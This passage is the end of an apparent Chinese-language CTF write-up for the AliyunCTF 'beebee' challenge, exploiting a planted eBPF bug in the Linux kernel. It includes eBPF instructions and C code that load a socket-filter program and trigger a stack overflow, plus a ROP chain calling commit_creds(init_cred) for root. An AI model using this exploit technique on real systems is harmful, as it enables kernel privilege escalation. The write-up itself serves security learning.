+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),   <span class="comment">// mov64 r1, r9 (恢复上下文指针)</span></span><br><span class="line">BPF_MOV64_IMM(BPF_REG_2, <span class="number">0</span>),           <span class="comment">// mov64 r2, 0 (设置偏移量)</span></span><br><span class="line">BPF_MOV64_REG(BPF_REG_3, BPF_REG_10),  <span class="comment">// mov64 r3, fp</span></span><br><span class="line">BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, <span class="number">-8</span>), <span class="comment">// r3 -= 8 (计算存储地址)</span></span><br><span class="line">BPF_LDX_MEM(BPF_DW, BPF_REG_4, BPF_REG_7, <span class="number">0</span>),<span class="comment">// r4 = [r7+0] (再次加载map值)</span></span><br><span class="line">BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, BPF_FUNC_skb_load_bytes),<span class="comment">// 加载数据包字节</span></span><br><span class="line">BPF_EXIT_INSN()                        <span class="comment">// exit (程序退出)</span></span><br></pre></td></tr></table></figure>
+
+<p>​	之后就是利用BPF_PROG_TYPE_SOCKET_FILTER进行test run,并且存储好伪造的数据也就是在30（0xe + 0x10）这里，自此就完成了整个攻击的全部流程。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Load BPF program</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">prog_attr</span> =</span> &#123;</span><br><span class="line">        .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,</span><br><span class="line">        .insn_cnt = <span class="keyword">sizeof</span>(prog) / <span class="keyword">sizeof</span>(<span class="keyword">struct</span> bpf_insn),</span><br><span class="line">        .insns = (<span class="type">uint64_t</span>)prog,</span><br><span class="line">        .log_buf = (<span class="type">uint64_t</span>)log_buf,</span><br><span class="line">        .log_size = LOG_BUF_SZ,</span><br><span class="line">        .log_level = <span class="number">1</span> | <span class="number">2</span>,</span><br><span class="line">        .license = (<span class="type">uint64_t</span>)<span class="string">&quot;GPL&quot;</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">int</span> prog_fd = SYSCHK(syscall(SYS_bpf, BPF_PROG_LOAD, &amp;prog_attr, <span class="keyword">sizeof</span>(prog_attr)));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Prepare ROP chain</span></span><br><span class="line">    <span class="type">char</span> data_buf[<span class="number">4096</span>] = &#123;&#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> __<span class="title">sk_buff</span> <span class="title">md</span> =</span> &#123;&#125;;</span><br><span class="line">    <span class="type">size_t</span>* rop_chain = (<span class="type">size_t</span>*)&amp;data_buf[<span class="number">30</span>];</span><br><span class="line">    *rop_chain++ = <span class="number">0xffffffff8130d3de</span>; <span class="comment">// pop rdi; ret</span></span><br><span class="line">    *rop_chain++ = <span class="number">0xffffffff82a52fa0</span>; <span class="comment">// init_cred</span></span><br><span class="line">    *rop_chain++ = <span class="number">0xffffffff810c3c50</span>; <span class="comment">// commit_creds</span></span><br><span class="line">    *rop_chain++ = <span class="number">0xffffffff8108e620</span>; <span class="comment">// vfork</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Execute BPF program</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">test_run_attr</span> =</span> &#123;</span><br><span class="line">        .test.prog_fd = prog_fd,</span><br><span class="line">        .test.data_size_in = <span class="number">1024</span>,</span><br><span class="line">        .test.data_in = (<span class="type">uint64_t</span>)data_buf,</span><br><span class="line">        .test.ctx_size_in = <span class="keyword">sizeof</span>(md),</span><br><span class="line">        .test.ctx_in = (<span class="type">uint64_t</span>)&amp;md</span><br><span class="line">    &#125;;</span><br><span class="line">    SYSCHK(syscall(SYS_bpf, BPF_PROG_TEST_RUN, &amp;test_run_attr, <span class="keyword">sizeof</span>(test_run_attr)));</span><br><span class="line">    close(prog_fd);</span><br></pre></td></tr></table></figure>
+
+<h2 id="三-总结"><a href="#三-总结" class="headerlink" title="三. 总结"></a>三. 总结</h2><p>​	本题题目主要是利用了eBPF人造出来的漏洞进行的攻击，通过这个攻击进行学习，可以更加清楚的了解eBPF的原理以及如何利用eBPF的漏洞实现内核态的攻击，希望通过这个漏洞的学习，可以方便我们之后对于内核攻击的深入理解。</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2026/02/07/AliyunCTF--Alimem/" rel="prev" title="">
+      <i class="fa fa-chevron-left"></i> 
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2026/02/07/CVE-2024-53141/" rel="next" title="">
+       <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#AliyunCTF%E2%80%93beebee"><span class="nav-number">1.</span> <span class="nav-text">AliyunCTF–beebee</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80-%E8%83%8C%E6%99%AF%E4%BB%8B%E7%BB%8D"><span class="nav-number">1.1.</span> <span class="nav-text">一.背景介绍</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-%E9%A2%98%E7%9B%AE%E8%83%8C%E6%99%AF%E8%AE%B2%E8%A7%A3"><span class="nav-number">1.1.1.</span> <span class="nav-text">1.1 题目背景讲解</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-eBPF%E7%9A%84%E8%83%8C%E6%99%AF%E7%9F%A5%E8%AF%86"><span class="nav-number">1.1.2.</span> <span class="nav-text">1.2 eBPF的背景知识</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-2-1-eBPF%E6%B1%87%E7%BC%96%E7%BC%96%E7%A8%8B"><span class="nav-number">1.1.2.1.</span> <span class="nav-text">1.2.1 eBPF汇编编程</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-3-sk-buff"><span class="nav-number">1.1.3.</span> <span class="nav-text">1.3 sk_buff</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-4-%E6%80%BB%E7%BB%93"><span class="nav-number">1.1.4.</span> <span class="nav-text">1.4 总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">1.2.</span> <span class="nav-text">二. 漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-%E9%A2%98%E7%9B%AE%E7%8E%AF%E5%A2%83%E8%A7%A3%E6%9E%90"><span class="nav-number">1.2.1.</span> <span class="nav-text">2.1 题目环境解析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-%E5%88%9D%E5%A7%8B%E5%8C%96%E8%AE%BE%E7%BD%AE%E5%8F%AA%E8%AF%BBmap"><span class="nav-number">1.2.2.</span> <span class="nav-text">2.2 初始化设置只读map</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E8%AE%BE%E7%BD%AE%E9%9D%9E%E9%A2%84%E6%9C%9F%E6%95%B0%E5%80%BC%E5%AE%9E%E7%8E%B0%E6%A0%88%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB"><span class="nav-number">1.2.3.</span> <span class="nav-text">2.3 通过漏洞设置非预期数值实现栈溢出攻击</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89-%E6%80%BB%E7%BB%93"><span class="nav-number">1.3.</span> <span class="nav-text">三. 总结</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">a2ure</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">5</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2026</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">a2ure</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="Symbols count total">20k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="Reading time total">1:13</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
